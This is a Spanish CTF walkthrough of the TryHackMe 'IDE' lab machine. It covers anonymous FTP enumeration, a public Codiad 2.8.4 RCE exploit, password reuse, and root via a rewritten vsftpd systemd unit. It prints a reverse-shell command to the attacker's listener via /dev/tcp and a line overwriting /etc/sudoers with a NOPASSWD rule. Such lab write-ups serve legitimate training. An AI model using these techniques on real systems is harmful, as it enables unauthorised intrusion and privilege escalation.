---
title : "IDE - Write Up - Español"
date : 2021-10-16T16:15:25+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "Máquina de nivel fácil en TryHackMe."
tags : ["FTP","nc","Codiad","sudo","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Here](https://tryhackme.com/room/ide)  | Fácil  |  [bluestorm](https://tryhackme.com/p/bluestorm) y [403Exploit](https://tryhackme.com/p/403Exploit)  |


## Reconocimiento

¡Ey! ¡Bienvenid@!
Como sabrás, comenzamos los CTF con un escaneo con `nmap`, ¡así que hagamos lo mismo con este!

```bash
╰─ lanfran@parrot ❯ sudo nmap 10.10.233.193 -p- -sS --min-rate 5000 -n -Pn
[sudo] password for lanfran: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-16 00:11 CEST
Nmap scan report for 10.10.233.193
Host is up (0.056s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
62337/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
```
¡Excelente! Ahora tenemos más información:
    · Tenemos un servidor FTP que se ejecuta en el puerto `21`.
    · Un servicio SSH que se ejecuta en el puerto `22`.
    · Un servidor web en el puerto `80`.
    · Un servicio desconocido que se ejecuta en `62337`.

Muy bien, intentemos descargar todos los datos que podamos del servidor `FTP` con el usuario `anonymous` (Si no sabe, el usuario `anonymous` es una cuenta predeterminada que no requiere una contraseña para iniciar sesión en el servicio `FTP`).
```bash
╰─ lanfran@parrot ❯ wget -m ftp://anonymous@10.10.78.174
--2021-10-16 00:18:16--  ftp://anonymous@10.10.78.174/
           => ‘10.10.78.174/.listing’
Connecting to 10.10.78.174:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

10.10.78.174/.listing                 [ <=>                                                        ]     180  --.-KB/s    in 0s      

2021-10-16 00:18:16 (6.37 MB/s) - ‘10.10.78.174/.listing’ saved [180]

--2021-10-16 00:18:16--  ftp://anonymous@10.10.78.174/.../
           => ‘10.10.78.174/.../.listing’
==> CWD (1) /... ... done.
==> PASV ... done.    ==> LIST ... done.

10.10.78.174/.../.listing             [ <=>                                                        ]     178  --.-KB/s    in 0s      

2021-10-16 00:18:17 (3.11 MB/s) - ‘10.10.78.174/.../.listing’ saved [178]

--2021-10-16 00:18:17--  ftp://anonymous@10.10.78.174/.../-
           => ‘10.10.78.174/.../-’
==> CWD not required.
==> PASV ... done.    ==> RETR - ... done.
Length: 151

10.10.78.174/.../-                100%[===========================================================>]     151  --.-KB/s    in 0.1s    

2021-10-16 00:18:17 (1.15 KB/s) - ‘10.10.78.174/.../-’ saved [151]

FINISHED --2021-10-16 00:18:17--
Total wall clock time: 1.5s
Downloaded: 3 files, 509 in 0.1s (3.88 KB/s)
```
¡Wow! Tenemos algunos nombres extraños para una carpeta y el archivo...

¡Así que intentemos cambiar el nombre del archivo `-` a un nombre más amigable y veamos qué tiene adentro!
```bash
╰─ lanfran@parrot ❯ mv \- data

╰─ lanfran@parrot ❯ cat data
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
Mmmm.... ahora sabemos que el usuario `john` tiene su contraseña restablecida a la predeterminada...

Veamos qué hay en el puerto `80` y el puerto `62337`.

Después de investigar un poco, el puerto `80` solo tiene un servidor web apache2 predeterminado en ejecución, la página web de interés está en el puerto `62337`.

¡Tenemos una página de inicio de sesión para `Codiad`, un IDE basado en web! ¡Y también sabemos que la versión es `2.8.4`!

![login](versión.png)

## Acceso inicial - Usuario

Entonces, después de buscar en Google algo fácil como `Codiad 2.8.4 exploit`, encontré un exploit público para obtener RCE con un usuario autenticado. [Aquí está el enlace al exploit](https://www.exploit-db.com/exploits/49705)

Hasta ahora todo bien, ¡ejecutemos el exploit!

```bash
╰─ lanfran@parrot ❯ python3 exp.py http://10.10.233.193:62337/ john [REDACTADO] 10.9.4.36 1337 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.9.4.36/1338 0>&1 2>&1"' | nc -lnvp 1337
nc -lnvp 1338
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y  
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
```
Después de ejecutar los comandos que sugiere el exploit, ¡finalmente tenemos un pie en la máquina!
```bash
╰─ lanfran@parrot ❯ nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.9.4.36] from (UNKNOWN) [10.10.233.193] 46490
bash: cannot set terminal process group (866): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Pero... no podemos leer la flag del usuario, porque necesitamos escalar al usuario `drac` para leer la bandera ...

Así que, al indagar en la máquina, encontramos que el usuario `drac` tiene el `.bash_history` con algo de información en su interior.
```bash
www-data@ide:/home/drac$ cat .bash_history 
mysql -u drac -p '[REDACTADO]'
```
¡Encontramos una contraseña! Quizás este usuario reutilice las contraseñas...
```bash
www-data@ide:/home/drac$ su drac 
Password: 
drac@ide:~$ cat /home/drac/user.txt 
0[REDACTADO]6
```
¡SÍ! ¡Lo hicimos! ¡Ahora finalmente leamos la flag del usuario!

## Root

¡Ahora tenemos que escalar a root!

Para esto, hacemos el primer intento como en cada máquina `sudo -l` y podemos reiniciar el servicio `vsftpd`.
```bash
drac@ide:~$ sudo -l
[sudo] password for drac: 
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```
¡Así que quizás podamos explotar este servicio si podemos editar el archivo `vsftpd.service`!

¡Y si! ¡Podemos editarlo!
```bash
drac@ide:~$ cat /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
drac@ide:~$ nano /lib/systemd/system/vsftpd.service
drac@ide:~$
```
Así que lo editamos para ejecutar un comando:
`ExecStart=/bin/sh -c 'echo "drac ALL=(root) NOPASSWD: ALL" > /etc/sudoers'`


¡Este comando agregará nuestro usuario `drac` en el archivo `sudoers` para ejecutar todos los comandos como `root`!

Entonces, después de editar el archivo, debería verse así:
```bash
drac@ide:~$ cat /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c 'echo "drac ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```
¡Excelente! Reiniciemos el servicio y recarguemos las unidades:
```bash
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
```
Después de esto, ¡podemos verificar si nuestro exploit funcionó!

¡SÍ! ¡Ahora podemos ejecutar `sudo` para todo!
```bash
drac@ide:~$ sudo -l
User drac may run the following commands on ide:
    (root) NOPASSWD: ALL
```
Así que ejecutemos `sudo su` para obtener `root`
```bash
drac@ide:~$ sudo su
root@ide:/home/drac# id
uid=0(root) gid=0(root) groups=0(root)
root@ide:/home/drac# cat /root/root.txt 
c[REDACTADO]d
```

¡Y hemos rooteado la máquina!

Eso es todo de mi parte, ¡espero que lo encuentre útil!